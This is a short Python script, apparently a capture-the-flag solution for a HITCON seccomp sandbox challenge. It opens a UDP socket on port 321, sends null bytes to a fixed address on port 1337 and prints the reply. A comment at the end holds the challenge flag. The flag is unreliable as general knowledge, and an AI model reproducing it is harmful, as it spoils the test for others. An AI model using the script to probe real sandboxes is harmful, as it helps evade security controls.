import socket

try:
	with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
		print('Binding')
		s.bind(('0.0.0.0', 321))
		print('Connecting')
		s.connect(('172.12.34.56', 1337))
		print('Sending')
		s.sendall(b'\0' * 0x100)
		print(s.recv(0x100))
except Exception as e:
	print(e)


# hitcon{level1__i_should_not_have_used_whitelist_seccomp:(}
